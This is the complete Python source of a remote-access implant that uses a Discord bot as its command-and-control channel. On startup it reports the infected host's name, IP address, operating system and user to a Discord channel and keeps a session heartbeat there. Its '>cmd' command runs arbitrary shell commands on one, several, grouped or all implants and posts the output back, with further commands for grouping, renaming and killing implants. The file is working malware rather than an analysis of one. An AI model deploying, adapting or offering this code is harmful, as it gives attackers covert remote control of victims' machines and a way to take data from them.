import time
import uuid
import socket
import os
import discord
import sys
import asyncio
from discord.ext import commands
from subprocess import check_output
from datetime import datetime, timedelta, timezone

# constants, configs, globals
target_channel_name = "general"
sessions_channel_name = "sessions"
max_msg_size = 2000
cmd_prefix = '>'

## configure session reactions
good_react = '🟩'
mins_stale = 2
stale_react = '🟨'
mins_dead = 5
dead_react = '🟥'
mins_remove = 10

## setup bot
intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix=cmd_prefix, intents=intents)

## store instance of Implant
global implant

# keep track of implant stuff
class Implant:
	def __init__(self):
		self.main_channel = self.get_channel(target_channel_name)
		self.sessions_channel = self.get_channel(sessions_channel_name)
		self.uuid = self.get_uuid()
		self.id = self.uuid
		self.hostname = self.get_hostname()
		self.ip = self.get_ip()
		self.os = self.get_os()
		self.user = self.get_user()
		self.note = ""
		self.groups = []

	def get_channel(self, channel_name):
		try:
			for guild in bot.guilds:
				for channel in guild.text_channels:
					if channel.name == channel_name:
						return bot.get_channel(channel.id)
		except Exception as ex:
			log_err(f'Fatal error getting target channel: {ex}')
			log_err(f'Exiting')
			sys.exit()
	
	def get_uuid(self):
		return str(uuid.uuid1())[:8]
	
	def set_id(self, new_id):
		self.id = new_id

	def get_hostname(self):
		try:
			return run_cmd("hostname")
		except Exception as ex:
			log_warn(f'Error getting hostname: {ex}')
			return "?"
	
	def get_ip(self):
		try:
			return [l for l in ([ip for ip in socket.gethostbyname_ex(socket.gethostname())[2] if not ip.startswith("127.")][:1], [[(s.connect(('8.8.8.8', 53)), s.getsockname()[0], s.close()) for s in [socket.socket(socket.AF_INET, socket.SOCK_DGRAM)]][0][1]]) if l][0][0]
		except Exception as ex:
			log_warn(f'Error getting ip address:')
			return "?"

	def get_os(self):
		try:
			return "Windows" if os.name == 'nt' else "Linux"
		except Exception as ex:
			log_warn(f'Error getting os: {ex}')
			return "?"

	def get_user(self):
		try:
			return run_cmd("whoami")
		except Exception as ex:
			log_warn(f'Error getting username: {ex}')
			return "?"

	def add_to_group(self, group):
		self.groups.append(group)

	def remove_from_group(self, group):
		self.groups.remove(group)


# helper functions
def get_datetime():
	return time.strftime('[%Y-%m-%d %H:%M:%S]')

## logging
def log_msg(msg):
	print(f'{get_datetime()} {msg}')

def log_good(msg):
	log_msg(f'[+] {msg}')

def log_info(msg):
	log_msg(f'[i] {msg}')

def log_err(msg):
	log_msg(f'[X] {msg}')

def log_warn(msg):
	log_msg(f'[!] {msg}')

## send messages to discord server
async def send_msg(ctx, msg):
	try:
		if len(msg) >= max_msg_size:
			await ctx.send(f'{msg[:max_msg_size]}')
			await send_msg(ctx, msg[max_msg_size:])
		else:
			await ctx.send(f'{msg}')
	except Exception as ex:
		log_warn(f'Error sending message: {msg} | {ex}')

async def reply_thread(ctx, msg):
	thread = None
	try:
		thread = await ctx.message.create_thread(name=f'{ctx.message.author.name} {ctx.message.content}', auto_archive_duration=60)
	except:
		thread = await ctx.message.fetch_thread()

	try:
		if len(msg) >= max_msg_size:
			await thread.send(f'{msg[:max_msg_size]}')
			await reply_thread(ctx, msg[max_msg_size:])
		else:
			await thread.send(msg)
	except Exception as ex:
		log_warn(f'Error replying to thread: {ex}')

async def reply_thread_once(ctx, msg):
	thread = None
	try:
		thread = await ctx.message.create_thread(name=f'{ctx.message.author.name} {ctx.message.content}', auto_archive_duration=60)
	except:
		return

	try:
		await thread.send(msg)
	except Exception as ex:
		log_warn(f'Error replying to thread: {ex}')

## remove an old message in the sessions channel
async def delete_session_entry(i_id):
	# delete any duplicates of self
	messages = [message async for message in implant.sessions_channel.history(limit=100)]
	for message in messages:
		if i_id in message.content:
			try:
				await message.delete()
			except Exception as ex:
				log_warn(f'Unable to delete message id {message.id}: {ex}')

## get string containing implant info
def get_implant_data_str():
	return f'ID: `{implant.id}` | HN: `{implant.hostname}` | IP: `{implant.ip}` | OS: `{implant.os}` | Usr: `{implant.user}` | Gps: `{implant.groups}`{f' | Note: `{implant.note}`' if not implant.note == "" else ""}'

## helpers for running a command
### actually run the command
def run_cmd(cmd):
	try:
		return check_output(cmd, shell=True).decode()
	except Exception as ex:
		return (f'Error running command {cmd}: {ex}')

### wrap command output with text
async def _cmd(ctx, arg):
	log_info(f'{implant.id} Command recieved: {arg}')
	await reply_thread(ctx, f'ID: `{implant.id}` Command recieved: `{arg}`\n\nOutput: ```{run_cmd(arg)}```')

### do things for different command targets
#### individual
async def i_cmd(ctx, arg):
	imp_id = arg[:arg.index(" ")]
	if not imp_id == implant.id:
		return

	arg = arg[(arg.index(" ")+1):]

	await _cmd(ctx, arg)

#### all
async def a_cmd(ctx, arg):
	await _cmd(ctx, arg)

#### windows
async def w_cmd(ctx, arg):
	if implant.os == 'Windows':
		await _cmd(ctx, arg)

#### linux
async def l_cmd(ctx, arg):
	if implant.os == 'Linux':
		await _cmd(ctx, arg)

#### multiple
async def m_cmd(ctx, arg):
	implants = arg[:arg.index(" ")].split(",")
	arg = arg[(arg.index(" ")+1):]
	for i in implants:
		if i == implant.id:
			await _cmd(ctx, arg)

#### group
async def g_cmd(ctx, arg):
	gp_id = arg[:arg.index(" ")]
	arg = arg[(arg.index(" ")+1):]
	for g in implant.groups:
		if g == gp_id:
			await _cmd(ctx, arg)

async def sessions_loop():
	utc_now = datetime.now(timezone.utc)

	log_info(f'Running sessions loop, current utc time: {utc_now}')

	# stale timestamp
	stale = utc_now-timedelta(minutes=mins_stale)
	# dead timestamp
	dead = utc_now-timedelta(minutes=mins_dead)
	# remove timestamp
	remove = utc_now-timedelta(minutes=mins_remove)

	# delete any old messages or duplicates of self, change react
	messages = [message async for message in implant.sessions_channel.history(limit=100)]
	for message in messages:
		
		if remove > message.created_at or implant.id in message.content:
			log_info(f'Found sessions message to remove with ID: {message.id}')
			log_info(f'Content: {message.content}')
			
			try:
				await message.delete()
			except Exception as ex:
				log_warn(f'Unable to delete msg ID {message.id}: {ex}')
		
		elif dead > message.created_at:
			found = False
			for r in message.reactions:
				if dead_react == r.emoji:
					found = True
			if found:
				continue

			log_info(f'Found dead sessions message with ID: {message.id}')
			log_info(f'Content: {message.content}')
			
			try:
				await message.clear_reactions()
				await message.add_reaction(dead_react)
			except Exception as ex:
				log_warn(f'Unable to clear or add reaction to msg ID {message.id}: {ex}')
		
		elif stale > message.created_at:
			found = False
			for r in message.reactions:
				if stale_react == r.emoji:
					found = True
			if found:
				continue

			log_info(f'Found stale sessions message with ID: {message.id}')
			log_info(f'Content: {message.content}')
			
			try:
				await message.clear_reactions()
				await message.add_reaction(stale_react)
			except Exception as ex:
				log_warn(f'Unable to clear or add reaction to msg ID {message.id}: {ex}')

	log_info(f'Adding new session message for implant ID: {implant.id}')
	# post new message
	try:
		note = implant.note
		new_msg = await implant.sessions_channel.send(get_implant_data_str())
		await new_msg.add_reaction(good_react)
	except Exception as ex:
		log_warn(f'Unable to add new session message or react to it: {ex}')

	log_info(f'Sleeping')
	await asyncio.sleep(60)

# bot land
## events
### i put setup stuff in here and the while loop for the session channel
@bot.event
async def on_ready():
	log_info(f'Logged in as {bot.user}')
	log_info(f'Performing init actions for implant')

	# setup tasks are done in the constructor for Implant
	global implant
	implant = Implant()

	log_good(f'Done performing init actions for implant')
	log_info(f'Current ID: {implant.id}')

	msg = ""
	msg += f'-----------------[NEW SESSION]-----------------\n'
	msg += f'| ID: `{implant.id}`\n'
	msg += f'| Hostname: `{implant.hostname}`'
	msg += f'| IP: `{implant.ip}`\n'
	msg += f'| OS: `{implant.os}`\n'
	msg += f'| Username: `{implant.user}`'
	msg += f'--------------------------------------------------'
	try:
		# tell the server we exist
		await implant.main_channel.send(msg)
	except Exception as ex:
		log_err(f'Failed to send new session message to server: {ex}')
	
	log_info(f'Entering sessions loop')
	while(True):
		await sessions_loop()
		
### fires when the bot sees a message. just logs that a message was seen
@bot.event
async def on_message(message):
	if message.author == bot.user:
		return

	log_info(f'Observed message ID {message.id} from {message.author.name} with content \"{message.content}\"')
	await bot.process_commands(message)

## bot commands
@bot.command()
async def ping(ctx):
	'''
	Get the latency of the bot
	'''

	latency = bot.latency  # Included in the Discord.py library
	# Send it to the user
	await reply_thread_once(ctx, f'Current latency: `{latency}`s')

async def __cmd(ctx, arg):
	log_info(f'Command recieved: {arg}')

	flag = arg[:2]
	log_info(f'Flag: {flag}')

	match flag:
		case "-i":
			await i_cmd(ctx, arg[3:])
		case "-a":
			await a_cmd(ctx, arg[3:])
		case "-w":
			await w_cmd(ctx, arg[3:])
		case "-l":
			await l_cmd(ctx, arg[3:])
		case "-m":
			await m_cmd(ctx, arg[3:])
		case "-g":
			await g_cmd(ctx, arg[3:])
		case _:
			log_warn(f'Unknown flag {flag} received')
			await reply_thread_once(ctx, f'Unknown flag `{flag}` received, please try again.')

	log_good(f'Finished processing command: {arg}')

@bot.command(rest_is_raw=True)
async def cmd(ctx, *, arg):
	'''
	Run a command on a/multiple implants

	>cmd -i [implant_id] [command]
		specific implant
	>cmd -a [command]
		all implants
	>cmd -w [command]
		windows implants
	>cmd -l [command]
		linux implants
	>cmd -m [implant_id],[implant_id],...[implant_id] [command]
		multiple implants in csv no whitespace
	>cmd -g [group_id] [command]
		command to all implants in a group
	'''
	await __cmd(ctx, arg)

@bot.command()
async def c(ctx, *, arg):
	await __cmd(ctx, arg)

@bot.command()
async def change_id(ctx, arg1, arg2):
	'''
	Change the ID of an implant
	'''

	if not arg1 == implant.id:
		return
	log_info(f'Changing implant id from {implant.id} to {arg2}')
	await reply_thread_once(ctx, f'Changing implant `{implant.id}` id to `{arg2}`')
	implant.set_id(arg2)

	await delete_session_entry(arg1)

@bot.command()
async def chid(ctx, arg1, arg2):
	await change_id(ctx, arg1, arg2)

@bot.command()
async def sessions(ctx):
	'''
	List the active sessions
	'''

	log_info(f'Received sessions command')
	await reply_thread(ctx, get_implant_data_str())

@bot.command()
async def s(ctx):
	await sessions(ctx)

@bot.command()
async def note(ctx, arg1, arg2):
	'''
	add or modify the note on the implant with the provided id
	'''

	if not arg1 == implant.id:
		return
	log_info(f'{implant.id} received note command with note {arg2}')
	await reply_thread_once(ctx, f'Updating note for implant `{implant.id}` to `{arg2}`')
	implant.note = arg2

@bot.command()
async def n(ctx, arg1, arg2):
	await note(ctx, arg1, arg2)

@bot.command()
async def kill(ctx, arg):
	'''
	kill the implant with the provided id
	'''
	if not arg == implant.id:
		return
	
	log_info(f'{implant.id} received kill command')
	await delete_session_entry(arg)
	await ctx.message.add_reaction('💀')
	sys.exit()

@bot.command()
async def k(ctx, arg):
	await kill(ctx, arg)

async def _add_to_group(ctx, arg):
	gp_id = arg[:arg.index(" ")]
	arg = arg[(arg.index(" ")+1):]
	implants = arg.split(",")
	for i in implants:
		if implant.id == i:
			implant.add_to_group(gp_id)
			await reply_thread(ctx, f'Added implant {implant.id} to group {gp_id}')

@bot.command()
async def add_to_group(ctx, *, arg):
	'''
	>add_to_group [group_id] [list of implant ids]
	'''
	await _add_to_group(ctx, arg)
	
@bot.command()
async def agp(ctx, *, arg):
	await _add_to_group(ctx, arg)

async def _remove_from_group(ctx, arg):
	gp_id = arg[:arg.index(" ")]
	arg = arg[(arg.index(" ")+1):]
	implants = arg.split(",")
	for i in implants:
		if implant.id == i:
			implant.remove_from_group(gp_id)
			await reply_thread(ctx, f'Removed implant {implant.id} from group {gp_id}')

@bot.command()
async def remove_from_group(ctx, *, arg):
	'''
	>remove_from_group [group_id] [list of implant ids]
	'''
	await _remove_from_group(ctx, arg)
	
@bot.command()
async def rgp(ctx, *, arg):
	await _remove_from_group(ctx, arg)

f = open("token.txt", "r")
bot.run(f.read())